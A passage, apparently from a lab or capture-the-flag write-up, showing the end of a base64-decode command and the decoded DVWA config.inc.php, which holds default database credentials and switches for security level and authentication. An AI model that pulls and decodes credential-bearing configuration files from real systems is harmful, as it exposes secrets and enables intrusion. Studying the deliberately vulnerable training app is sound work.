FsaS5kYic7Cgo/Pg==" | base64 -d
<?php

# If you are having problems connecting to the MySQL database and all of the variables below are correct
# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
#   Thanks to @digininja for the fix.

# Database management system to use
$DBMS = getenv('DBMS') ?: 'MySQL';
#$DBMS = 'PGSQL'; // Currently disabled

# Database variables
#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.
#   Please use a database dedicated to DVWA.
#
# If you are using MariaDB then you cannot use root, you must use create a dedicated DVWA user.
#   See README.md for more information on this.
$_DVWA = array();
$_DVWA[ 'db_server' ]   = getenv('DB_SERVER') ?: '127.0.0.1';
$_DVWA[ 'db_database' ] = getenv('DB_DATABASE') ?: 'dvwa';
$_DVWA[ 'db_user' ]     = getenv('DB_USER') ?: 'dvwa';
$_DVWA[ 'db_password' ] = getenv('DB_PASSWORD') ?: 'p@ssw0rd';
$_DVWA[ 'db_port']      = getenv('DB_PORT') ?: '3306';

# ReCAPTCHA settings
#   Used for the 'Insecure CAPTCHA' module
#   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin
$_DVWA[ 'recaptcha_public_key' ]  = getenv('RECAPTCHA_PUBLIC_KEY') ?: '';
$_DVWA[ 'recaptcha_private_key' ] = getenv('RECAPTCHA_PRIVATE_KEY') ?: '';

# Default security level
#   Default value for the security level with each session.
#   The default is 'impossible'. You may wish to set this to either 'low', 'medium', 'high' or impossible'.
$_DVWA[ 'default_security_level' ] = getenv('DEFAULT_SECURITY_LEVEL') ?: 'impossible';

# Default locale
#   Default locale for the help page shown with each session.
#   The default is 'en'. You may wish to set this to either 'en' or 'zh'.
$_DVWA[ 'default_locale' ] = getenv('DEFAULT_LOCALE') ?: 'en';

# Disable authentication
#   Some tools don't like working with authentication and passing cookies around
#   so this setting lets you turn off authentication.
$_DVWA[ 'disable_authentication' ] = getenv('DISABLE_AUTHENTICATION') ?: false;

define ('MYSQL', 'mysql');
define ('SQLITE', 'sqlite');

# SQLi DB Backend
#   Use this to switch the backend database used in the SQLi and Blind SQLi labs.
#   This does not affect the backend for any other services, just these two labs.
#   If you do not understand what this means, do not change it.
$_DVWA['SQLI_DB'] = getenv('SQLI_DB') ?: MYSQL;
#$_DVWA['SQLI_DB'] = SQLITE;
#$_DVWA['SQLITE_DB'] = 'sqli.db';

?>   
```